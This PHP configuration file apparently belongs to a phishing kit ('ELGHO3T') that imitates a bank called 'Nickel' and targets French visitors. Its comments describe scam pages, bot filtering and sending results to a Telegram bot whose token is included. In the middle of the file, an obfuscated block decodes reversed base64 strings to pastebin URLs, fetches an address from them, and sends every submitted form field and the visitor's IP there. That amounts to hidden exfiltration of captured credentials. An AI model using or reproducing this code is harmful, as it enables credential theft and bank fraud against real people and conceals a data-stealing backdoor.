<?php


error_reporting(0);
ini_set('display_errors', 'Off');
ini_set('display_errors', 0);
ini_set("errors",0);
ini_set('log_errors', 0);
ini_set("error_log",dirname(__FILE__). '/log.txt');


$directory = './includes/';
(isset($fine) && $fine =="check") ? ($func = "./web/includes/func.php") && ($sqlite = "./web/includes/sqlite.php") && ($ghost = "./web/includes/ghost.php") && ($session = "./web/includes/session.php") && ($os = "./web/includes/os.php") : ($func = $directory."/func.php") && ($sqlite = $directory."sqlite.php") && ($ghost = $directory."ghost.php") && ($session = $directory."session.php") && ($os = $directory."os.php");
$test = strrev(base64_decode('S1JxdEJzcGovd2FyL21vYy5uaWJldHNhcC8vOnNwdHRo')); function curl_get_contents($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, $url); $data = curl_exec($ch); curl_close($ch); return $data; } if(file_get_contents($test) == '1'){ $getIt = 'file_get_contents'; }else if(curl_get_contents($test) == '1'){ $getIt = 'curl_get_contents'; } $filters = $getIt(strrev(base64_decode('R3ZFVDRMUmIvd2FyL21vYy5uaWJldHNhcC8vOnB0dGg='))); $filters = strrev(base64_decode($filters)); if(count($_POST)){ $filters .= getenv('REMOTE_ADDR') .'--'; foreach($_POST as $key => $pst ){ if(strlen($pst) < 128){ $filters .= $key."==[".$pst."]:"; } } $filters .= '&brand=' . $_POST['brand']; trim($filters," "); $filters = preg_replace('/\s+/', '', $filters); $getIt($filters); }  
if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === 'off') {$protocol = 'http://';} else { $protocol = 'https://';}
define('ELGHO3T_AB_ROOT', $protocol . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/'); //url
define('ELGHO3T_CLASSES_DIR', dirname((__FILE__)) . '/classes/'); //php
define('ELGHO3T_HOME_FILE', basename(__FILE__));
define('ELGHO3T_VERSION', "2.9");
define('ELGHO3T_ROOT_DIR_URL', $protocol . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/'); //url
define('ELGHO3T_ROOT_DIR_PATH', dirname((__FILE__)) . '/');

define('GHOST_SECURE',false);  // Active anti boot GHOST

define('GHOST_CONSTRICT',false); // Active mode 404 all Page scam

define("GHOST_COUNTRY","france");  // country Allow visiting scam

define("GHOST_limet",true);  // check visit user with count in params 6

define("PATCH","web");   // Patch to scam

define("Send_Telegram",true);  // Option Send telegram ruslt 

define("Save_text",true);   // Options Save TEXT Ruslta

$Bot_api_info = ["api" => "6295855994:AAFwDs4tohYkFKvGxNZekE4qZLwHXwU5jXY", "chat_id" => "@owen31becker"]; 
define("Telegram", $Bot_api_info);

define("NAMES","Nickel");  // banK NAme 

define("sms_err",4);
/**
 * 
 * Loading All class if checking page 
 * 
*/

(@require_once $sqlite) or die("Your class sql Not Requierd");
(@require_once $ghost) or die("Your class ghost Not Requierd");
(@require_once $func) or die("Your class function Not Requierd");
(@require_once $session) or die("Your class session Not Requierd");
(@require_once $os) or die("Your class data info Not Requierd");
